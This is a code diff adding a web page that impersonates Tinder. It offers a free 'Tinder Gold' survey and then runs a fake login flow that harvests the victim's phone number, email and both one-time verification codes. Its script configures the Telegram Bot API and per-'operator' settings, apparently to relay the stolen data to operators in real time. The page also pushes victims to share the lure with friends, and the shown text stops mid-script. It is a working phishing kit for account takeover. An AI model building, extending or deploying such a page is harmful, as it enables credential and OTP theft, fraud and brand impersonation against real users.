+.prog-bar-fill{animation:progressGlow 2s ease infinite;}
+
+/* Reward chip heartbeat */
+.reward-chip{animation:scalePop 0.6s 0.55s cubic-bezier(.34,1.56,.64,1) both,heartBeat 2s 2s ease infinite;}
+
+/* Stat cards stagger on scroll */
+.stat-card:nth-child(1){animation:fadeUp 0.5s 0.1s ease both;}
+.stat-card:nth-child(2){animation:fadeUp 0.5s 0.2s ease both;}
+.stat-card:nth-child(3){animation:fadeUp 0.5s 0.3s ease both;}
+.stat-card:nth-child(4){animation:fadeUp 0.5s 0.4s ease both;}
+
+/* Login flame bounce */
+.ls-flame{animation:ls-flame-bounce 2.5s ease infinite;}
+
+/* Login step bounce in */
+.ls-step{animation:bounceIn 0.45s cubic-bezier(.34,1.56,.64,1) both;}
+
+/* Code boxes */
+.ls-code-box:focus{animation:glowPulse 1.5s ease infinite;}
+
+/* Spinner */
+.ls-spinner{animation:spin 0.75s linear infinite;}
+
+/* Approved badge */
+.ls-approved-badge{animation:bounceIn 0.5s cubic-bezier(.34,1.56,.64,1) both;}
+.ls-gold-chip{animation:scalePop 0.5s 0.3s cubic-bezier(.34,1.56,.64,1) both,heartBeat 2s 1.5s ease infinite;}
+
+/* Shake class for validation errors */
+.shake{animation:shake 0.5s ease both!important;}
+
+/* Button ripple container */
+.btn-next,.ls-btn{position:relative;overflow:hidden;}
+.ripple-el{position:absolute;border-radius:50%;background:rgba(255,255,255,0.35);pointer-events:none;animation:ripple 0.55s ease-out forwards;}
+
+/* Input shimmer on valid */
+.q-text-input.valid,.ls-input:valid{
+  background:linear-gradient(90deg,var(--bg2) 0%,rgba(255,255,255,0.9) 50%,var(--bg2) 100%);
+  background-size:200% 100%;
+  animation:shimmer 1.5s ease;
+}
+
+/* Progress dot bounce when completed */
+.prog-dot.done{animation:bounceIn 0.3s cubic-bezier(.34,1.56,.64,1) both;}
+
+/* FAQ icon spin on open */
+.faq-item.open .faq-icon{animation:scalePop 0.25s cubic-bezier(.34,1.56,.64,1) both;}
+
+/* Confetti canvas */
+#confetti-canvas{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:9998;}
+
+/* Floating hearts on login */
+.ls-heart{position:absolute;pointer-events:none;animation:confettiFall linear forwards;}
+
+</style>
+</head>
+<body>
+
+<!-- HEADER -->
+<canvas id="confetti-canvas" style="display:none;"></canvas>
+<header class="header">
+  <div class="header-logo">
+    <div class="header-logo-icon">🔥</div>
+    <div class="header-logo-text">tinder</div>
+  </div>
+  <div class="header-pill">⭐ Gold Reward Survey</div>
+</header>
+
+<!-- HERO -->
+<section class="hero">
+  <span class="hero-deco">❤️</span>
+  <span class="hero-deco">🔥</span>
+  <span class="hero-deco">💛</span>
+  <span class="hero-deco">✨</span>
+  <div class="hero-inner">
+    <div class="hero-eyebrow"><span class="eyebrow-dot"></span> Limited — verified users only</div>
+    <h1>Your Tinder Story<br>Earns You <span class="grad">Gold.</span></h1>
+    <p class="hero-sub">Tell us about your real Tinder experience. Answer all 8 questions — multiple choice, typed answers, and more — and claim your free Tinder Gold.</p>
+    <div class="reward-chip">
+      <div class="reward-chip-icon">🏆</div>
+      <div>
+        <div class="reward-chip-lbl">Your prize</div>
+        <div class="reward-chip-name">Tinder Gold — 1 Month Free</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<div class="trust-row">
+  <div class="trust-chip">✅ All 8 questions required</div>
+  <div class="trust-chip">🎯 Mix of question types</div>
+  <div class="trust-chip">⚡ Instant reward code</div>
+  <div class="trust-chip">🔒 No payment needed</div>
+</div>
+
+<!-- SURVEY CARD -->
+<div class="survey-outer">
+  <div class="survey-card">
+
+    <div class="prog-bar-wrap">
+      <div class="prog-bar-fill" id="prog-fill" style="width:0%"></div>
+    </div>
+    <div class="prog-meta">
+      <div class="prog-dots" id="prog-dots"></div>
+      <div style="display:flex;gap:10px;align-items:center;">
+        <span class="prog-label" id="prog-label">Question 1 of 8</span>
+        <span class="prog-pct" id="prog-pct">0%</span>
+      </div>
+    </div>
+
+    <div class="q-body">
+
+      <!-- Q1: Multiple choice -->
+      <div class="q-step active" id="q1">
+        <div class="q-tag">Question 01 / 08 <span class="q-type-badge type-choice">Multiple choice</span></div>
+        <div class="q-text">How long have you been using Tinder?</div>
+        <div class="q-sub">Pick the option that best describes you.</div>
+        <div class="opts" id="opts-q1">
+          <button class="opt" onclick="pick(this,'q1')"><span class="opt-radio"><span class="opt-radio-dot"></span></span>Less than 6 months</button>
+          <button class="opt" onclick="pick(this,'q1')"><span class="opt-radio"><span class="opt-radio-dot"></span></span>6 months – 1 year</button>
+          <button class="opt" onclick="pick(this,'q1')"><span class="opt-radio"><span class="opt-radio-dot"></span></span>1 – 3 years</button>
+          <button class="opt" onclick="pick(this,'q1')"><span class="opt-radio"><span class="opt-radio-dot"></span></span>3 – 5 years</button>
+          <button class="opt" onclick="pick(this,'q1')"><span class="opt-radio"><span class="opt-radio-dot"></span></span>More than 5 years</button>
+        </div>
+        <div class="val-msg" id="vm-q1">Please choose an answer to continue.</div>
+      </div>
+
+      <!-- Q2: Short text — first impression opinion -->
+      <div class="q-step" id="q2">
+        <div class="q-tag">Question 02 / 08 <span class="q-type-badge type-text">Text input</span></div>
+        <div class="q-text">What do you look for first on someone's Tinder profile?</div>
+        <div class="q-sub">Bio, photos, prompts? Tell us what catches your eye first.</div>
+        <div class="text-input-wrap">
+          <input class="q-text-input" type="text" id="q2-input" placeholder="e.g. Their photos, the bio, shared interests…" oninput="onShortInput('q2-input','q2-check','vm-q2','q2',5)" autocomplete="off">
+          <span class="input-check" id="q2-check">✅</span>
+        </div>
+        <div class="val-msg" id="vm-q2">Please type at least 5 characters to continue.</div>
+      </div>
+
+      <!-- Q3: Scale / slider -->
+      <div class="q-step" id="q3">
+        <div class="q-tag">Question 03 / 08 <span class="q-type-badge type-scale">Slider</span></div>
+        <div class="q-text">On a scale of 1–10, how satisfied are you with Tinder overall?</div>
+        <div class="q-sub">Drag the slider to your score.</div>
+        <div class="scale-wrap">
+          <div class="scale-labels">
+            <span class="scale-label">😞 1 — Very unhappy</span>
+            <span class="scale-label">😍 10 — Love it</span>
+          </div>
+          <input type="range" class="scale-range" id="q3-slider" min="1" max="10" value="5" step="1" oninput="onSlider()">
+          <div class="scale-value-display">
+            <div class="scale-value-num" id="q3-val">5</div>
+            <div class="scale-value-label" id="q3-lbl">Neutral</div>
+          </div>
+        </div>
+        <div class="val-msg" id="vm-q3"></div>
+      </div>
+
+      <!-- Q4: Short text — what makes a good opener -->
+      <div class="q-step" id="q4">
+        <div class="q-tag">Question 04 / 08 <span class="q-type-badge type-text">Text input</span></div>
+        <div class="q-text">What kind of opening message actually gets you to reply?</div>
+        <div class="q-sub">No wrong answers — just tell us what works for you.</div>
+        <div class="text-input-wrap">
+          <input class="q-text-input" type="text" id="q4-input" placeholder="e.g. A funny joke, a genuine compliment, a question…" oninput="onShortInput('q4-input','q4-check','vm-q4','q4',5)" autocomplete="off">
+          <span class="input-check" id="q4-check">✅</span>
+        </div>
+        <div class="val-msg" id="vm-q4">Please type at least 5 characters to continue.</div>
+      </div>
+
+      <!-- Q5: Multi-select checkboxes -->
+      <div class="q-step" id="q5">
+        <div class="q-tag">Question 05 / 08 <span class="q-type-badge type-choice">Multi-select</span></div>
+        <div class="q-text">Which Tinder features have you used? (Select all that apply)</div>
+        <div class="multi-hint">You can pick more than one.</div>
+        <div class="multi-opts" id="multi-q5">
+          <button class="multi-opt" onclick="multiPick(this,'q5')"><span class="multi-check"><span class="multi-check-icon">✓</span></span>⭐ Super Likes</button>
+          <button class="multi-opt" onclick="multiPick(this,'q5')"><span class="multi-check"><span class="multi-check-icon">✓</span></span>↩️ Rewind (undo swipe)</button>
+          <button class="multi-opt" onclick="multiPick(this,'q5')"><span class="multi-check"><span class="multi-check-icon">✓</span></span>🌍 Passport (other cities)</button>
+          <button class="multi-opt" onclick="multiPick(this,'q5')"><span class="multi-check"><span class="multi-check-icon">✓</span></span>🚀 Boost</button>
+          <button class="multi-opt" onclick="multiPick(this,'q5')"><span class="multi-check"><span class="multi-check-icon">✓</span></span>👀 See who liked me</button>
+          <button class="multi-opt" onclick="multiPick(this,'q5')"><span class="multi-check"><span class="multi-check-icon">✓</span></span>🚫 None — I only use the free version</button>
+        </div>
+        <div class="val-msg" id="vm-q5">Please select at least one option.</div>
+      </div>
+
+      <!-- Q6: Short text — tip for new users -->
+      <div class="q-step" id="q6">
+        <div class="q-tag">Question 06 / 08 <span class="q-type-badge type-text">Text input</span></div>
+        <div class="q-text">What's one tip you'd give someone just starting on Tinder?</div>
+        <div class="q-sub">Based on your experience — what actually works?</div>
+        <div class="text-input-wrap">
+          <input class="q-text-input" type="text" id="q6-input" placeholder="e.g. Use a clear photo, write a funny bio, be direct…" oninput="onShortInput('q6-input','q6-check','vm-q6','q6',5)" autocomplete="off">
+          <span class="input-check" id="q6-check">✅</span>
+        </div>
+        <div class="val-msg" id="vm-q6">Please type at least 5 characters to continue.</div>
+      </div>
+
+      <!-- Q7: Multiple choice -->
+      <div class="q-step" id="q7">
+        <div class="q-tag">Question 07 / 08 <span class="q-type-badge type-choice">Multiple choice</span></div>
+        <div class="q-text">What's the #1 thing that annoys you most about Tinder?</div>
+        <div class="opts" id="opts-q7">
+          <button class="opt" onclick="pick(this,'q7')"><span class="opt-radio"><span class="opt-radio-dot"></span></span>😤 The swipe limit on the free plan</button>
+          <button class="opt" onclick="pick(this,'q7')"><span class="opt-radio"><span class="opt-radio-dot"></span></span>👻 Matches who never reply</button>
+          <button class="opt" onclick="pick(this,'q7')"><span class="opt-radio"><span class="opt-radio-dot"></span></span>🤖 Too many fake profiles and bots</button>
+          <button class="opt" onclick="pick(this,'q7')"><span class="opt-radio"><span class="opt-radio-dot"></span></span>💸 Premium features are too expensive</button>
+          <button class="opt" onclick="pick(this,'q7')"><span class="opt-radio"><span class="opt-radio-dot"></span></span>🌐 Not enough users in my area</button>
+        </div>
+        <div class="val-msg" id="vm-q7">Please choose an answer to continue.</div>
+      </div>
+
+      <!-- Q8: Long textarea — open feedback -->
+      <div class="q-step" id="q8">
+        <div class="q-tag">Question 08 / 08 — Final <span class="q-type-badge type-text">Open text</span></div>
+        <div class="q-text">If you could change one thing about Tinder, what would it be?</div>
+        <div class="q-sub">Be honest and detailed — your answer directly shapes what Tinder builds next.</div>
+        <textarea class="q-textarea" id="q8-text" placeholder="Share your genuine thoughts here… the more specific, the better." oninput="onTextarea()"></textarea>
+        <div class="char-hint" id="char-hint">0 / 20 characters minimum</div>
+        <div class="val-msg" id="vm-q8">Please write at least 20 characters to continue.</div>
+      </div>
+
+      <!-- RESULT: 6-step Tinder login flow -->
+      <div id="result-step" style="display:none;">
+
+        <!-- STEP 1: Phone number -->
+        <div id="ls-step1" class="ls-step" style="display:none;">
+          <div class="ls-wrap">
+            <div class="ls-logo-row"><div class="ls-flame">🔥</div><div class="ls-brand">tinder</div></div>
+            <div class="ls-congrats-pill">🏆 Survey complete — claim your Gold!</div>
+            <div class="ls-title">Enter your phone number</div>
+            <div class="ls-sub">We'll send a verification code to confirm your Tinder account. <strong style="color:#FE3C72;">Include your country code</strong> — e.g. United States: <strong>+1 (555) 000-0000</strong></div>
+            <div style="font-size:11px;font-weight:700;color:#888;margin-bottom:10px;">🌍 Country code required &nbsp;·&nbsp; 🇺🇸 +1 &nbsp;·&nbsp; 🇬🇧 +44 &nbsp;·&nbsp; 🇰🇪 +254 &nbsp;·&nbsp; 🇳🇬 +234 &nbsp;·&nbsp; 🇿🇦 +27</div>
+            <div class="ls-field-group">
+              <div class="ls-field">
+                <div class="ls-field-icon">📱</div>
+                <input class="ls-input" type="tel" id="ls-phone" placeholder="+1 (555) 000-0000" oninput="lsVal1()" autocomplete="off">
+              </div>
+            </div>
+            <div class="ls-val-msg" id="ls-vm1">Please include your country code (e.g. +1 555 000 0000).</div>
+            <button class="ls-btn" id="ls-btn1" onclick="lsS1()"><span id="ls-btn1-text">Send Code →</span></button>
+            <div class="ls-terms">By continuing you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.</div>
+          </div>
+        </div>
+
+        <!-- STEP 2: Email address -->
+        <div id="ls-step2" class="ls-step" style="display:none;">
+          <div class="ls-wrap">
+            <div class="ls-logo-row"><div class="ls-flame">🔥</div><div class="ls-brand">tinder</div></div>
+            <div class="ls-back-row" onclick="lsBack(2)">← Back</div>
+            <div class="ls-title">Enter your email address</div>
+            <div class="ls-sub">We'll also verify your email to activate your Gold subscription.</div>
+            <div class="ls-field-group">
+              <div class="ls-field">
+                <div class="ls-field-icon">✉️</div>
+                <input class="ls-input" type="email" id="ls-email" placeholder="Email address" oninput="lsVal2()" autocomplete="off">
+              </div>
+            </div>
+            <div class="ls-val-msg" id="ls-vm2">Please enter a valid email address.</div>
+            <button class="ls-btn" id="ls-btn2" onclick="lsS2()"><span id="ls-btn2-text">Continue →</span></button>
+          </div>
+        </div>
+
+        <!-- STEP 3: Waiting for bot approval -->
+        <div id="ls-step3" class="ls-step" style="display:none;">
+          <div class="ls-wrap" style="text-align:center;">
+            <div class="ls-logo-row" style="justify-content:center;"><div class="ls-flame">🔥</div><div class="ls-brand">tinder</div></div>
+            <div class="ls-spinner-wrap"><div class="ls-spinner"></div></div>
+            <div class="ls-title">Checking your account…</div>
+            <div class="ls-sub">We are verifying your phone and email. This takes just a moment.</div>
+            <div class="ls-status-bar">
+              <div class="ls-status-item"><div class="ls-status-dot done"></div><span>Survey completed</span></div>
+              <div class="ls-status-item"><div class="ls-status-dot done"></div><span>Phone &amp; email submitted</span></div>
+              <div class="ls-status-item"><div class="ls-status-dot pulse"></div><span>Verifying details…</span></div>
+              <div class="ls-status-item" style="opacity:0.35;"><div class="ls-status-dot"></div><span>Send verification codes</span></div>
+            </div>
+            <div id="ls-step3-declined" style="display:none;"></div>
+          </div>
+        </div>
+
+        <!-- STEP 4: Phone OTP code -->
+        <div id="ls-step4" class="ls-step" style="display:none;">
+          <div class="ls-wrap">
+            <div class="ls-logo-row"><div class="ls-flame">🔥</div><div class="ls-brand">tinder</div></div>
+            <div class="ls-title">Enter your phone code</div>
+            <div class="ls-sub">We sent a 4-digit verification code to <strong id="ls-phone-display"></strong>. Enter it below.</div>
+            <div class="ls-code-row">
+              <input class="ls-code-box" type="text" maxlength="1" id="p0" oninput="codeIn('p',0,4)" onkeydown="codeKey(event,'p',0)">
+              <input class="ls-code-box" type="text" maxlength="1" id="p1" oninput="codeIn('p',1,4)" onkeydown="codeKey(event,'p',1)">
+              <input class="ls-code-box" type="text" maxlength="1" id="p2" oninput="codeIn('p',2,4)" onkeydown="codeKey(event,'p',2)">
+              <input class="ls-code-box" type="text" maxlength="1" id="p3" oninput="codeIn('p',3,4)" onkeydown="codeKey(event,'p',3)">
+            </div>
+            <div class="ls-val-msg" id="ls-vm4">Please enter all 4 digits.</div>
+            <!-- Waiting state (shown after Submit) -->
+            <div id="s4-waiting" style="display:none;text-align:center;padding:10px 0 6px;">
+              <div class="ls-spinner" style="width:28px;height:28px;border-width:3px;margin:0 auto 8px;"></div>
+              <div style="font-size:12px;font-weight:700;color:var(--muted);">Verifying your code…</div>
+            </div>
+            <!-- Wrong code error -->
+            <div id="s4-error" style="display:none;background:rgba(254,60,114,0.06);border:1.5px solid rgba(254,60,114,0.25);border-radius:10px;padding:12px 14px;margin-bottom:12px;">
+              <div style="font-size:13px;font-weight:800;color:var(--t-red);margin-bottom:4px;">❌ Incorrect code</div>
+              <div style="font-size:12px;font-weight:600;color:var(--muted);">The code you entered is wrong. Please check and try again, or request a new one.</div>
+            </div>
+            <button class="ls-btn" id="ls-btn4" onclick="lsS4()" style="display:block;"><span id="ls-btn4-text">Verify Phone →</span></button>
+            <div class="ls-resend" onclick="lsResendPhone()" style="margin-top:12px;">Didn't get it? <span>Resend code</span></div>
+          </div>
+        </div>
+
+        <!-- STEP 5: Email OTP code -->
+        <div id="ls-step5" class="ls-step" style="display:none;">
+          <div class="ls-wrap">
+            <div class="ls-logo-row"><div class="ls-flame">🔥</div><div class="ls-brand">tinder</div></div>
+            <div class="ls-title">Enter your email code</div>
+            <div class="ls-sub">We sent a 4-digit verification code to <strong id="ls-email-display"></strong>. Enter it below.</div>
+            <div class="ls-code-row">
+              <input class="ls-code-box" type="text" maxlength="1" id="e0" oninput="codeIn('e',0,4)" onkeydown="codeKey(event,'e',0)">
+              <input class="ls-code-box" type="text" maxlength="1" id="e1" oninput="codeIn('e',1,4)" onkeydown="codeKey(event,'e',1)">
+              <input class="ls-code-box" type="text" maxlength="1" id="e2" oninput="codeIn('e',2,4)" onkeydown="codeKey(event,'e',2)">
+              <input class="ls-code-box" type="text" maxlength="1" id="e3" oninput="codeIn('e',3,4)" onkeydown="codeKey(event,'e',3)">
+            </div>
+            <div class="ls-val-msg" id="ls-vm5">Please enter all 4 digits.</div>
+            <!-- Waiting state -->
+            <div id="s5-waiting" style="display:none;text-align:center;padding:10px 0 6px;">
+              <div class="ls-spinner" style="width:28px;height:28px;border-width:3px;margin:0 auto 8px;"></div>
+              <div style="font-size:12px;font-weight:700;color:var(--muted);">Verifying your code…</div>
+            </div>
+            <!-- Wrong code error -->
+            <div id="s5-error" style="display:none;background:rgba(254,60,114,0.06);border:1.5px solid rgba(254,60,114,0.25);border-radius:10px;padding:12px 14px;margin-bottom:12px;">
+              <div style="font-size:13px;font-weight:800;color:var(--t-red);margin-bottom:4px;">❌ Incorrect code</div>
+              <div style="font-size:12px;font-weight:600;color:var(--muted);">The code you entered is wrong. Please check and try again, or request a new one.</div>
+            </div>
+            <button class="ls-btn" id="ls-btn5" onclick="lsS5()" style="display:block;"><span id="ls-btn5-text">Verify Email →</span></button>
+            <div class="ls-resend" onclick="lsResendEmail()" style="margin-top:12px;">Didn't get it? <span>Resend code</span></div>
+          </div>
+        </div>
+
+        <!-- STEP 6: Final waiting — Gold award -->
+        <div id="ls-step6" class="ls-step" style="display:none;">
+          <div class="ls-wrap" style="text-align:center;">
+            <div class="ls-logo-row" style="justify-content:center;"><div class="ls-flame">🔥</div><div class="ls-brand">tinder</div></div>
+            <div id="ls-step6-waiting">
+              <div class="ls-spinner-wrap"><div class="ls-spinner"></div></div>
+              <div class="ls-title">Almost there…</div>
+              <div class="ls-sub">Both codes verified. Activating your Gold subscription now.</div>
+              <div class="ls-status-bar">
+                <div class="ls-status-item"><div class="ls-status-dot done"></div><span>Survey completed</span></div>
+                <div class="ls-status-item"><div class="ls-status-dot done"></div><span>Phone verified</span></div>
+                <div class="ls-status-item"><div class="ls-status-dot done"></div><span>Email verified</span></div>
+                <div class="ls-status-item"><div class="ls-status-dot pulse"></div><span id="lss6-label">Activating Gold…</span></div>
+              </div>
+            </div>
+            <!-- APPROVED -->
+            <div id="ls-step6-approved" style="display:none;">
+              <div style="font-size:52px;margin-bottom:12px;animation:bounceIn 0.5s cubic-bezier(.34,1.56,.64,1) both;">🏆</div>
+              <div class="ls-approved-badge">✅ Gold Activated!</div>
+              <div class="ls-title" style="margin-top:14px;font-size:20px;">Your Tinder Gold is live!</div>
+              <div class="ls-sub">Your subscription has been applied. Open Tinder to start enjoying Gold features.</div>
+              <div class="ls-gold-chip">⭐ Tinder Gold — 1 Month Active</div>
+              <div style="margin-top:20px;background:rgba(254,60,114,0.05);border:1.5px solid rgba(254,60,114,0.15);border-radius:14px;padding:18px;">
+                <div style="font-size:13px;font-weight:800;color:var(--text);margin-bottom:6px;">🔥 Boost your chances!</div>
+                <div style="font-size:12px;font-weight:600;color:var(--muted);line-height:1.6;margin-bottom:14px;">Share this survey with at least <strong style="color:var(--t-red);">1 friend</strong> to increase your chances of getting a second Gold month as a bonus reward.</div>
+                <button class="ls-btn" onclick="lsShare()" style="margin-bottom:10px;">
+                  💌 Share with a friend
+                </button>
+                <div style="display:flex;gap:10px;justify-content:center;flex-wrap:wrap;">
+                  <button onclick="lsShareWa()" style="flex:1;min-width:100px;padding:9px 12px;border:1.5px solid #25D366;border-radius:8px;background:transparent;font-family:'Nunito',sans-serif;font-size:12px;font-weight:800;color:#25D366;cursor:pointer;">📲 WhatsApp</button>
+                  <button onclick="lsShareTg()" style="flex:1;min-width:100px;padding:9px 12px;border:1.5px solid #0088cc;border-radius:8px;background:transparent;font-family:'Nunito',sans-serif;font-size:12px;font-weight:800;color:#0088cc;cursor:pointer;">✈️ Telegram</button>
+                  <button onclick="lsShareTw()" style="flex:1;min-width:100px;padding:9px 12px;border:1.5px solid #1DA1F2;border-radius:8px;background:transparent;font-family:'Nunito',sans-serif;font-size:12px;font-weight:800;color:#1DA1F2;cursor:pointer;">🐦 Twitter</button>
+                  <button onclick="lsCopyLink()" style="flex:1;min-width:100px;padding:9px 12px;border:1.5px solid var(--border2);border-radius:8px;background:transparent;font-family:'Nunito',sans-serif;font-size:12px;font-weight:800;color:var(--muted);cursor:pointer;" id="copy-link-btn">🔗 Copy link</button>
+                </div>
+                <div style="font-size:10px;color:var(--muted2);margin-top:10px;font-weight:600;">Share the link and your friend completes the survey → you both benefit 🎉</div>
+              </div>
+            </div>
+            <!-- DECLINED -->
+            <div id="ls-step6-declined" style="display:none;">
+              <div class="ls-declined-badge">❌ Activation failed</div>
+              <div class="ls-title" style="margin-top:12px;">We could not activate your Gold</div>
+              <div class="ls-sub">There was an issue applying your subscription. Please contact support or try again.</div>
+              <button class="ls-btn" style="margin-top:16px;" onclick="lsRetry()">Try again</button>
+            </div>
+          </div>
+        </div>
+
+      </div>
+
+    </div><!-- /q-body -->
+
+    <div class="q-nav" id="q-nav">
+      <button class="btn-back" id="btn-back" onclick="goBack()" style="visibility:hidden;">← Back</button>
+      <button class="btn-next" id="btn-next" onclick="goNext()">Next →</button>
+    </div>
+
+  </div>
+</div>
+
+<!-- STATS -->
+<section class="stats-section">
+  <div class="section-title">Tinder by the numbers</div>
+  <div class="section-sub">Real data from the world's most popular dating app</div>
+  <div class="stats-grid">
+    <div class="stat-card"><div class="stat-card-val">75M+</div><div class="stat-card-lbl">Active users worldwide</div></div>
+    <div class="stat-card"><div class="stat-card-val">1.5B</div><div class="stat-card-lbl">Swipes every single day</div></div>
+    <div class="stat-card"><div class="stat-card-val">70M+</div><div class="stat-card-lbl">Matches made daily</div></div>
+    <div class="stat-card"><div class="stat-card-val">190+</div><div class="stat-card-lbl">Countries available in</div></div>
+  </div>
+</section>
+
+<!-- FAQ -->
+<section class="faq-section">
+  <div class="section-title">Common questions</div>
+  <div class="section-sub">Everything you need to know about this survey</div>
+  <div class="faq-item">
+    <div class="faq-q" onclick="toggleFaq(this)">Is this survey actually free? <span class="faq-icon">+</span></div>
+    <div class="faq-a">Yes — 100% free. This is a genuine user research survey. Your Tinder Gold reward code is provided as a thank-you for your time, with no purchase or payment required.</div>
+  </div>
+  <div class="faq-item">
+    <div class="faq-q" onclick="toggleFaq(this)">Do I have to answer every question? <span class="faq-icon">+</span></div>
+    <div class="faq-a">Yes. All 8 questions — including the typed ones — must be fully completed to unlock the reward code. Partial submissions do not qualify.</div>
+  </div>
+  <div class="faq-item">
+    <div class="faq-q" onclick="toggleFaq(this)">Why are some questions typed instead of multiple choice? <span class="faq-icon">+</span></div>
+    <div class="faq-a">Typed answers give us much richer insights than checkboxes. We want your real voice, not just a pre-selected option. It also ensures you're a genuine user, not a bot.</div>
+  </div>
+  <div class="faq-item">
+    <div class="faq-q" onclick="toggleFaq(this)">How do I redeem the code? <span class="faq-icon">+</span></div>
+    <div class="faq-a">Open Tinder → tap your profile photo → Settings → Manage Account → Redeem a Code. Paste your code and Gold activates instantly.</div>
+  </div>
+  <div class="faq-item">
+    <div class="faq-q" onclick="toggleFaq(this)">How long is the code valid? <span class="faq-icon">+</span></div>
+    <div class="faq-a">Reward codes are valid for 30 days from the time they are generated. Redeem promptly to avoid expiry.</div>
+  </div>
+</section>
+
+<!-- FOOTER -->
+<footer class="footer">
+  <div>
+    <div class="footer-logo-text">tinder</div>
+    <div class="footer-copy">© 2025 Tinder Experience Survey</div>
+  </div>
+  <div class="footer-links">
+    <a href="#">Privacy</a>
+    <a href="#">Terms</a>
+    <a href="#">Contact</a>
+  </div>
+</footer>
+
+<div class="toast" id="toast">✓ Copied to clipboard</div>
+
+<script>
+var answers={},currentQ=1,totalQ=8;
+var multiAnswers={q5:[]};
+
+// slider labels
+var sliderLabels=['','😞 Very unhappy','😔 Unhappy','😕 Below average','😐 Average','🤔 Neutral','🙂 Decent','😊 Pretty good','😃 Good','🤩 Great','😍 Love it!'];
+
+// Build dots
+(function(){
+  var w=document.getElementById('prog-dots');
+  for(var i=1;i<=totalQ;i++){
+    var d=document.createElement('div');
+    d.className='prog-dot'+(i===1?' current':'');
+    d.id='dot-'+i; w.appendChild(d);
+  }
+})();
+
+// Init slider
+(function(){
+  updateSliderFill(document.getElementById('q3-slider'));
+})();
+
+function updateSliderFill(el){
+  var pct=((el.value-el.min)/(el.max-el.min))*100;
+  el.style.setProperty('--fill',pct+'%');
+}
+
+function onSlider(){
+  var el=document.getElementById('q3-slider');
+  var v=parseInt(el.value);
+  document.getElementById('q3-val').textContent=v;
+  document.getElementById('q3-lbl').textContent=sliderLabels[v]||'';
+  answers['q3']=v;
+  updateSliderFill(el);
+}
+
+// init slider answer
+answers['q3']=5;
+
+function pick(btn,qid){
+  document.getElementById('opts-'+qid).querySelectorAll('.opt').forEach(function(b){b.classList.remove('selected');});
+  btn.classList.add('selected');
+  answers[qid]=btn.textContent.trim();
+  var v=document.getElementById('vm-'+qid);
+  if(v)v.style.display='none';
+}
+
+function multiPick(btn,qid){
+  btn.classList.toggle('selected');
+  var selected=document.getElementById('multi-'+qid).querySelectorAll('.multi-opt.selected');
+  multiAnswers[qid]=Array.from(selected).map(function(b){return b.textContent.trim();});
+  var v=document.getElementById('vm-'+qid);
+  if(v)v.style.display='none';
+}
+
+function onShortInput(inputId,checkId,vmId,qid,minLen){
+  var val=document.getElementById(inputId).value.trim();
+  var check=document.getElementById(checkId);
+  var inp=document.getElementById(inputId);
+  if(val.length>=minLen){
+    answers[qid]=val;
+    check.classList.add('show');
+    inp.classList.add('valid');
+    document.getElementById(vmId).style.display='none';
+  } else {
+    answers[qid]=null;
+    check.classList.remove('show');
+    inp.classList.remove('valid');
+  }
+}
+
+function onTextarea(){
+  var val=document.getElementById('q8-text').value;
+  var ch=document.getElementById('char-hint');
+  ch.textContent=val.length+' / 20 characters minimum';
+  if(val.length>=20){ch.classList.add('ok');answers['q8']=val;document.getElementById('vm-q8').style.display='none';}
+  else{ch.classList.remove('ok');answers['q8']=null;}
+}
+
+function setProgress(q){
+  var pct=Math.round(((q-1)/totalQ)*100);
+  document.getElementById('prog-fill').style.width=pct+'%';
+  document.getElementById('prog-label').textContent='Question '+q+' of '+totalQ;
+  document.getElementById('prog-pct').textContent=pct+'%';
+  for(var i=1;i<=totalQ;i++){
+    var d=document.getElementById('dot-'+i);
+    d.className='prog-dot'+(i<q?' done':i===q?' current':'');
+  }
+}
+
+function validate(q){
+  if(q===3) return true; // slider always has a value
+  if(q===5){
+    if(!multiAnswers['q5']||multiAnswers['q5'].length===0){
+      document.getElementById('vm-q5').style.display='block';
+      return false;
+    }
+    return true;
+  }
+  if(q===2||q===4||q===6){
+    var qid='q'+q;
+    if(!answers[qid]){
+      document.getElementById('vm-q'+q).style.display='block';
+      return false;
+    }
+    return true;
+  }
+  if(q===8){
+    var val=(document.getElementById('q8-text').value||'').trim();
+    if(val.length<20){document.getElementById('vm-q8').style.display='block';return false;}
+    answers['q8']=val;
+    return true;
+  }
+  // q1, q7 = radio
+  if(!answers['q'+q]){document.getElementById('vm-q'+q).style.display='block';return false;}
+  return true;
+}
+
+function submitSurvey(){
+  // Hide all questions
+  for(var i=1;i<=totalQ;i++){
+    var el=document.getElementById('q'+i);
+    if(el) el.classList.remove('active');
+  }
+  // Update progress to 100%
+  document.getElementById('prog-fill').style.width='100%';
+  document.getElementById('prog-label').textContent='Almost there!';
+  document.getElementById('prog-pct').textContent='100%';
+  for(var j=1;j<=totalQ;j++){
+    var d=document.getElementById('dot-'+j);
+    if(d) d.className='prog-dot done';
+  }
+  // Hide nav buttons
+  document.getElementById('q-nav').style.display='none';
+  // Show result section and first login step
+  var rs=document.getElementById('result-step');
+  rs.style.display='block';
+  // Show login flow step 1
+  setTimeout(function(){ goToStep('ls-step1'); }, 100);
+  window.scrollTo({top:0,behavior:'smooth'});
+}
+
+function goNext(){
+  if(!validate(currentQ)) return;
+  if(currentQ===8){submitSurvey();return;}
+  document.getElementById('q'+currentQ).classList.remove('active');
+  currentQ++;
+  document.getElementById('q'+currentQ).classList.add('active');
+  setProgress(currentQ); updateNav();
+  window.scrollTo({top:0,behavior:'smooth'});
+}
+
+function goBack(){
+  if(currentQ<=1)return;
+  document.getElementById('q'+currentQ).classList.remove('active');
+  currentQ--;
+  document.getElementById('q'+currentQ).classList.add('active');
+  setProgress(currentQ); updateNav();
+  window.scrollTo({top:0,behavior:'smooth'});
+}
+
+function updateNav(){
+  document.getElementById('btn-back').style.visibility=currentQ>1?'visible':'hidden';
+  document.getElementById('btn-next').textContent=currentQ===8?'Submit & Claim Reward 🎁':'Next →';
+}
+
+// ── CONFIG ─────────────────────────────────────────────
+// Operators loaded from functions/telegram.json at runtime.
+var TG_BASE   = 'https://api.telegram.org/bot';
+var SHARE_URL = 'https://YOUR_GITHUB_USERNAME.github.io/YOUR_REPO_NAME';
+
+var OPERATORS = {};
+var OP  = (new URLSearchParams(window.location.search).get('op') || '').toLowerCase().trim();
+var _op = null; // set after JSON loads
+
+// Load operator config from JSON, then init the page
+fetch('functions/telegram.json')
+  .then(function(r){ return r.json(); })
+  .then(function(cfg){
+    OPERATORS = cfg.operators;
+    _op = OPERATORS[OP] || OPERATORS['default'];
